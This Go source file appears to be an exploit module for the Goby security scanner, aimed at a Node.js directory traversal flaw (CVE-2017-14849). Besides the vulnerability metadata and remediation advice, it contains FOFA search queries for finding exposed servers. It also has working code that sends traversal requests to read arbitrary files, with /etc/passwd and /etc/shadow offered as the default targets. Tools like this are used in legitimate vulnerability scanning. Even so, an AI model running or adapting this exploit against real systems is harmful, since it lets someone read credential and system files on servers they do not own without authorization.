package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Node.js Directory Traversal (CVE-2017-14849)",
    "Description": "Node.js 8.5.0 before 8.6.0 allows remote attackers to access unintended files, because a change to \"..\" handling was incompatible with the pathname validation used by unspecified community modules.",
    "Impact": "Node.js Directory Traversal (CVE-2017-14849)",
    "Recommendation": "<p>The vendor has released a bug fix, please keep an eye on the update: <a href=\"https://nodejs.org\">https://nodejs.org</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system. </p>",
    "Product": "Node.js",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "Node.js 目录遍历漏洞（CVE-2017-14849）",
            "Description": "<p>Node.js是美国Joyent公司的一套建立在Google V8 JavaScript引擎之上的网络应用平台。</p><p>Node.js 8.6.0之前的8.5.0版本中存在任意文件读取漏洞。远程攻击者可利用该漏洞访问敏感文件进一步接管系统。</p>",
            "Impact": "<p>Node.js 8.6.0之前的8.5.0版本中存在任意文件读取漏洞。远程攻击者可利用该漏洞访问敏感文件进一步接管系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://nodejs.org\">https://nodejs.org</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "node_JS-Node.js",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Node.js Directory Traversal (CVE-2017-14849)",
            "Description": "Node.js 8.5.0 before 8.6.0 allows remote attackers to access unintended files, because a change to \"..\" handling was incompatible with the pathname validation used by unspecified community modules.",
            "Impact": "Node.js Directory Traversal (CVE-2017-14849)",
            "Recommendation": "<p>The vendor has released a bug fix, please keep an eye on the update: <a href=\"https://nodejs.org\">https://nodejs.org</a></p><p >1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system. </p>",
            "Product": "Node.js",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "(header=\"X-Powered-By: Express\" || header=\"pump.io\" || header=\"node.js\" || banner=\"X-Powered-By: Express\" || banner=\"pump.io\" || banner=\"node.js\")",
    "GobyQuery": "(header=\"X-Powered-By: Express\" || header=\"pump.io\" || header=\"node.js\" || banner=\"X-Powered-By: Express\" || banner=\"pump.io\" || banner=\"node.js\")",
    "Author": "mengzd@foxmail.com",
    "Homepage": "https://nodejs.org/",
    "DisclosureDate": "2021-06-10",
    "References": [
        "https://gobies.org/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2017-14849"
    ],
    "CNVD": [
        "CNVD-2017-34796"
    ],
    "CNNVD": [
        "CNNVD-201709-1260"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "File",
            "type": "createSelect",
            "value": "/etc/passwd,/etc/shadow",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			min := 10
			max := 20
			pathDepth := rand.Intn(max-min) + min
			randomPath := goutils.RandomHexString(4) + "/"
			uri := "/static/" + strings.Repeat("../", pathDepth-1) + randomPath +
				strings.Repeat("../", pathDepth) + "/etc/passwd"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root:") && strings.Contains(resp.RawBody, ":/") {
					uri2 := "/static/" + strings.Repeat("../", pathDepth-1) + randomPath +
						strings.Repeat("../", pathDepth) + "/etc/passwd/x"
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						if resp2.RawBody != resp.RawBody {
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			file := ss.Params["File"].(string)
			min := 10
			max := 20
			pathDepth := rand.Intn(max-min) + min
			randomPath := goutils.RandomHexString(4) + "/"
			uri := "/static/" + strings.Repeat("../", pathDepth-1) + randomPath +
				strings.Repeat("../", pathDepth) + file
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
